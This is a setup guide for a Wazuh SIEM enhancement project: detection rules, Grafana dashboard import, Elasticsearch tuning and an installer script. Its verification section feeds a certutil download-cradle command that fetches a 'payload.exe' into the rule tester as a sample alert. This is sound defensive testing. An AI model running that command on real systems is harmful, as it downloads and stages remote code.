# 📘 Full Installation Guide  
### Wazuh SIEM Enhancement Platform – Version 1.0  
**Author:** Roshan Bajracharya  
**License:** GPL-3.0  

This document provides a complete, production-grade installation workflow for deploying the **Wazuh SIEM Enhancement Platform**, including:

- 26 custom MITRE ATT&CK–aligned detection rules  
- Advanced threat-visualisation Grafana dashboard (50+ panels)  
- D3FEND enrichment pipeline  
- 398 ATT&CK → D3FEND mappings  
- Host-risk scoring, LOLBins analytics, APT chain tracking  

---

# 📋 Table of Contents
1. [Prerequisites](#1-prerequisites)  
2. [Architecture Overview](#2-architecture-overview)  
3. [Installation Steps](#3-installation-steps)  
4. [Configuration](#4-configuration)  
5. [Verification](#5-verification)  
6. [Troubleshooting](#6-troubleshooting)  
7. [Upgrade Guide](#7-upgrade-guide)  
8. [Appendix: Automated Installer Script](#appendix-automated-installer-script)

---

# 1 Prerequisites

## 1.1 Supported OS
- Ubuntu 20.04 / 22.04  
- Debian 10 / 11  
- CentOS / RHEL 7/8 (community support)

## 1.2 Hardware Requirements
| Component | Minimum | Recommended |
|----------|---------|-------------|
| CPU      | 4 cores | 8 cores     |
| RAM      | 8 GB    | 16+ GB      |
| Storage  | 50 GB   | 100+ GB SSD |
| Network  | 1514/udp, 1515/tcp, 55000/tcp, 9200/tcp, 3000/tcp | Same |

## 1.3 Software Requirements
- Wazuh Manager **4.8.0+**  
- Elasticsearch or OpenSearch **7.10.2+**  
- Grafana **9+**  
- Git, curl, Python 3.8+  

## 1.4 Quick System Checks

```bash
/var/ossec/bin/wazuh-control info
curl -X GET "localhost:9200"
systemctl status grafana-server
```

---

# 2 Architecture Overview

```text
AGENTS (Windows/Linux)
   │  Sysmon, 4688, PowerShell, WMI, commands
   ▼
WAZUH MANAGER
   ├── 26 custom rules (local_rules.xml)
   ├── ATT&CK metadata
   └── Behavioural alerting
   ▼
ELASTICSEARCH
   ├── wazuh-alerts-* index
   ├── D3FEND enrichment (398 mappings)
   └── Query-optimised storage
   ▼
GRAFANA DASHBOARD
   ├── 50+ analytic panels
   ├── Host-risk scoring
   ├── ATT&CK tactic/technique analytics
   └── APT, Fileless, LOLBins activity
```

This architecture enables end-to-end detection, enrichment, and visualisation using only open-source components.

---

# 3 Installation Steps

## STEP 1 — Backup Existing Wazuh Configuration

```bash
cd /var/ossec/etc

sudo cp rules/local_rules.xml rules/local_rules.xml.bak.$(date +%F)
sudo cp ossec.conf ossec.conf.bak.$(date +%F)
```

---

## STEP 2 — Clone the Repository

```bash
cd /tmp
git clone https://github.com/bajraroshan/wazuh-siem-enhancement.git
cd wazuh-siem-enhancement
```

Repo structure (simplified):

```text
rules/
dashboards/
d3fend/
scripts/
docs/
```

---

## STEP 3 — Deploy the 26 Custom Detection Rules

Your project extends Wazuh’s `local_rules.xml` directly.

```bash
sudo cp rules/local_rules.xml /var/ossec/etc/rules/
sudo chown wazuh:wazuh /var/ossec/etc/rules/local_rules.xml
sudo chmod 640 /var/ossec/etc/rules/local_rules.xml
```

---

## STEP 4 — Update `ossec.conf`

Open the main configuration file:

```bash
sudo nano /var/ossec/etc/ossec.conf
```

Ensure the `<ruleset>` block contains at least:

```xml
<ruleset>
    <decoder_dir>ruleset/decoders</decoder_dir>
    <rule_dir>ruleset/rules</rule_dir>

    <!-- Enhanced detection rules -->
    <include>local_rules.xml</include>
</ruleset>
```

No duplicate `<include>` entries are required.  
Your enhanced `local_rules.xml` will now be loaded by Wazuh.

---

## STEP 5 — Validate Rule Syntax

```bash
sudo /var/ossec/bin/wazuh-logtest -t
```

Expected output (example):

```text
wazuh-logtest: INFO: Started (pid: 12345).
wazuh-logtest: INFO: Total rules enabled: 11xxx
```

The total rule count should increase relative to your previous baseline.

---

## STEP 6 — Restart Wazuh Manager

```bash
sudo systemctl restart wazuh-manager
sudo systemctl status wazuh-manager
```

Check logs for any errors:

```bash
sudo tail -n 50 /var/ossec/logs/ossec.log
```

---

## STEP 7 — Configure Grafana Datasource

1. Open Grafana in a browser: `http://<server-ip>:3000`
2. Go to: **Configuration → Data Sources → Add data source**
3. Select **Elasticsearch**

Use the following values:

- **Name:** `Wazuh-Alerts`  
- **URL:** `http://localhost:9200` (or your ES endpoint)  
- **Index name:** `wazuh-alerts-*`  
- **Time field name:** `timestamp`  
- **Version:** `7.10+`  
- **Min time interval:** `10s`

Click **Save & Test** and confirm: *“Data source is working”*.

---

## STEP 8 — Import the Advanced Dashboard

Your repo ships with:

```text
dashboards/wazuh-mitre-advanced-threat-dashboard.json
```

In Grafana:

1. Navigate to **Dashboards → Import**  
2. Click **Upload JSON file**  
3. Select `wazuh-mitre-advanced-threat-dashboard.json`  
4. Choose datasource: **Wazuh-Alerts**  
5. Click **Import**

The dashboard with 50+ panels should load successfully.

---

# 4 Configuration

## 4.1 Windows Agent Telemetry

To fully support the detection rules, enable:

- Security event log (4688 process creation)  
- PowerShell Operational channel  
- (Optionally) Sysmon Operational channel  

Example Wazuh agent config snippet:

```xml
<localfile>
    <location>Security</location>
    <log_format>eventchannel</log_format>
</localfile>

<localfile>
    <location>Microsoft-Windows-PowerShell/Operational</location>
    <log_format>eventchannel</log_format>
</localfile>

<localfile>
    <location>Microsoft-Windows-Sysmon/Operational</location>
    <log_format>eventchannel</log_format>
</localfile>
```

Restart the agent:

```powershell
Restart-Service wazuh
```

---

## 4.2 Elasticsearch Tuning for Dashboard Performance

Increase refresh interval to reduce load:

```bash
curl -X PUT "localhost:9200/wazuh-alerts-*/_settings"   -H 'Content-Type: application/json' -d'
{
  "index": {
    "refresh_interval": "30s"
  }
}'
```

Increase maximum result window for large datasets:

```bash
curl -X PUT "localhost:9200/wazuh-alerts-*/_settings"   -H 'Content-Type: application/json' -d'
{
  "index": {
    "max_result_window": 20000
  }
}'
```

---

# 5 Verification

## 5.1 Verify Rules Are Loaded

```bash
sudo /var/ossec/bin/wazuh-logtest -t | grep "Total rules"
```

You should see the total rule count increased relative to the default installation.

---

## 5.2 Generate Test Alerts

Basic test (certutil-like activity):

```bash
echo "certutil.exe -urlcache -split -f http://example.com/payload.exe" |   sudo /var/ossec/bin/wazuh-logtest
```

Expected: a rule related to download cradles / LOLBins should trigger.

---

## 5.3 Check Alerts in Elasticsearch

```bash
curl -X GET "localhost:9200/wazuh-alerts-*/_search?pretty"   -H 'Content-Type: application/json' -d'
{
  "size": 5,
  "sort": [{ "timestamp": "desc" }]
}
'
```

Verify that:

- New alerts are present  
- ATT&CK fields (e.g., `rule.mitre.id`) appear for relevant rules  
- D3FEND fields (after enrichment) appear as expected (e.g., `d3fend.actions`)

---

## 5.4 Validate Dashboard

Open the imported Grafana dashboard and check that:

- Overall alert counts are populated  
- ATT&CK tactic and technique panels show data  
- LOLBin and fileless panels show activity (after tests)  
- Host-risk scoring panels render correctly  
- Queries complete within a few seconds

---

# 6 Troubleshooting

## 6.1 Rules Not Loading

Check syntax:

```bash
sudo /var/ossec/bin/wazuh-logtest -t
```

Check file permissions:

```bash
ls -l /var/ossec/etc/rules/local_rules.xml
# Should show owner: wazuh:wazuh and mode: -rw-r-----
```

Check configuration references:

```bash
grep -n "local_rules.xml" /var/ossec/etc/ossec.conf
```

---

## 6.2 Empty Dashboard Panels

1. Confirm Elasticsearch indices:

```bash
curl -X GET "localhost:9200/_cat/indices/wazuh-alerts-*?v"
```

2. Confirm alerts exist:

```bash
curl -X GET "localhost:9200/wazuh-alerts-*/_count?pretty"
```

3. Check Grafana time range (e.g., *Last 1 hour*, *Last 24 hours*).  
4. Verify correct datasource is selected for each panel.

---

## 6.3 Performance Issues

- Reduce dashboard auto-refresh rate (e.g., from 5s to 30s or 1m)  
- Filter to a shorter time window (e.g., last 1 hour)  
- Apply host or severity filters where possible  
- Increase Elasticsearch heap (`/etc/elasticsearch/jvm.options`)  

Example:

```bash
sudo nano /etc/elasticsearch/jvm.options
# Set:
# -Xms4g
# -Xmx4g

sudo systemctl restart elasticsearch
```

---

# 7 Upgrade Guide

## 7.1 Upgrading the Rules

To update to a newer version of `local_rules.xml` from the repo:

```bash
cd /tmp/wazuh-siem-enhancement
git pull origin main

sudo cp rules/local_rules.xml /var/ossec/etc/rules/
sudo chown wazuh:wazuh /var/ossec/etc/rules/local_rules.xml
sudo chmod 640 /var/ossec/etc/rules/local_rules.xml

sudo /var/ossec/bin/wazuh-logtest -t
sudo systemctl restart wazuh-manager
```

---

## 7.2 Upgrading the Dashboard

1. Export the existing dashboard (optional backup).  
2. Import the latest JSON from `dashboards/` in the repo.  
3. When prompted, choose **Update existing dashboard** (rather than creating a new one).

---

## 7.3 Upgrading the D3FEND Pipeline

If your repo includes an update script (for example):

```bash
cd d3fend
bash install-d3fend-pipeline.sh
```

Re-run this script after updating the repository to refresh mappings and pipeline configuration.

---

# Appendix: Automated Installer Script

Below is a simple automation script that performs backup, rule deployment, validation, and restart. You can adapt it to your environment.

```bash
#!/bin/bash
# full_installation.sh
# Automated installer for Wazuh SIEM Enhancement

set -e

WAZUH_DIR="/var/ossec"
RULES_DIR="$WAZUH_DIR/etc/rules"
BACKUP_DIR="$RULES_DIR/backup.$(date +%F_%H%M)"

echo "[1/5] Backing up existing configuration..."
mkdir -p "$BACKUP_DIR"
cp "$RULES_DIR/local_rules.xml" "$BACKUP_DIR/"
cp "$WAZUH_DIR/etc/ossec.conf" "$BACKUP_DIR/"

echo "[2/5] Deploying custom rules from repository..."
cp rules/local_rules.xml "$RULES_DIR/"
chown wazuh:wazuh "$RULES_DIR/local_rules.xml"
chmod 640 "$RULES_DIR/local_rules.xml"

echo "[3/5] Validating rules..."
/var/ossec/bin/wazuh-logtest -t

echo "[4/5] Restarting Wazuh manager..."
systemctl restart wazuh-manager

echo "[5/5] Installation complete!"
echo "Backup saved to: $BACKUP_DIR"
echo "Next steps:"
echo "  - Configure Grafana datasource"
echo "  - Import the advanced dashboard from dashboards/"
```

Run it from within the cloned repository:

```bash
chmod +x full_installation.sh
sudo ./full_installation.sh
```

---

✅ **Installation finished.**  
The enhanced detection rules and advanced dashboard are now deployed.  
Proceed to the **Dashboard Customisation Guide** and **Rule Development Guide** for further tuning and extension.
